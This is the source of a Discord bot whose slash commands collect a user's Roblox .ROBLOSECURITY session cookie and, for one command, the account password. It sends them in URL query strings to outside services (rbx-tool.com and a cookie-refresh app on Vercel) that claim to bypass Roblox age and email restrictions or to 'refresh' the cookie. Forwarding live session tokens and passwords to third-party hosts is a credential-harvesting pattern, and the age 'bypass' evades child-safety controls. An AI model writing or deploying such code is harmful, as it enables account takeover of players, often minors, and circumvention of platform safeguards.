const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
require('dotenv').config();
const fetch = require('node-fetch');

// Initialize client
const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

// Slash command registration
client.on('ready', async () => {
  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('bypass13plus')
      .setDescription('Bypass 13+ account to under 13')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('password')
          .setDescription('Your Roblox password')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your Roblox cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your old .ROBLOSECURITY cookie')
          .setRequired(true)
      )
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('✅ Slash commands registered');
  } catch (err) {
    console.error('❌ Error registering commands:', err);
  }
});

// Slash command logic
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  // ✅ Restrict to only one channel
  const allowedChannel = '1392522417254961273';
  if (interaction.channelId !== allowedChannel) {
    return interaction.reply({ content: '❌ You can only use this command in the designated channel.', ephemeral: true });
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'application/json'
        }
      });
      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
        .setDescription(data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"));

      await interaction.followUp({ embeds: [embed] });
    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.");
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'bypass13plus') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'application/json'
        }
      });
      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
        .setDescription(data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"));

      await interaction.followUp({ embeds: [embed] });
    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.");
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    const cookie = interaction.options.getString('cookie');
    await interaction.reply({ content: '🔄 Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'application/json'
        }
      });

      const data = await res.json();

      if (!data.success) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ Refresh Failed')
          .setDescription(data.error || 'Unknown error during cookie refresh.');

        return await interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x22c55e)
        .setTitle('✅ Cookie Refreshed')
        .setDescription(`\`\`\`${data.refreshedCookie}\`\`\``)
        .setFooter({ text: 'Keep it safe. Don’t share your cookie.' });

      await interaction.followUp({ embeds: [embed] });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Failed to reach the cookie refresh server.");

      await interaction.followUp({ embeds: [embed] });
    }
  }
});

client.login(process.env.BOT_TOKEN);
